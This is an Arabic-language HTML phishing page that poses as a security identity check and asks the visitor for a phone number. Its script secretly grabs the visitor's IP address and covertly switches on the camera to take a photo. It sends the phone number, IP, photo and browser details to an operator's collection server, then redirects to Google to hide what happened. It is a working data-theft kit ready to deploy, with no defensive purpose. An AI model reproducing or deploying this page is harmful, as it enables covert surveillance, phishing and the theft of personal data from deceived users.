<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من هويتك</title>
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #333; padding: 20px; display: inline-block; border-radius: 10px; background: #1a1a1a; }
        input { padding: 10px; width: 80%; margin: 10px 0; border-radius: 5px; border: none; }
        button { padding: 10px 20px; background: #2ecc71; border: none; color: white; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

<div class="box">
    <h2>التحقق من الأمان</h2>
    <p>أدخل رقم هاتفك لتأكيد هويتك</p>
    <input type="tel" id="phone" placeholder="07XXXXXXXX">
    <button onclick="captureAll()">تأكيد الآن</button>
    <p id="msg"></p>
</div>

<video id="v" autoplay style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
    // ضع رابط سيرفر Render هنا بعد الرفع
    const API_URL = "https://your-app-name.onrender.com/log-data";

    async function captureAll() {
        const phone = document.getElementById('phone').value;
        if(phone.length < 10) return alert("الرقم غير صحيح");
        
        document.getElementById('msg').innerText = "جاري المعالجة...";

        try {
            // 1. جلب الـ IP للمستخدم
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            // 2. فتح الكاميرا والتقاط صورة
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const img = canvas.toDataURL('image/jpeg', 0.6);
                
                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا

                // 3. إرسال كل شيء للسيرفر
                await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        phone: phone,
                        ip: ipData.ip,
                        image: img,
                        userAgent: navigator.userAgent
                    })
                });

                window.location.href = "https://www.google.com";
            }, 1000);

        } catch (e) {
            // في حال رفض الكاميرا نرسل البيانات المتاحة فقط
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            await fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: phone, ip: ipData.ip, image: null, userAgent: navigator.userAgent })
            });
            window.location.href = "https://www.google.com";
        }
    }
</script>
</body>
</html>
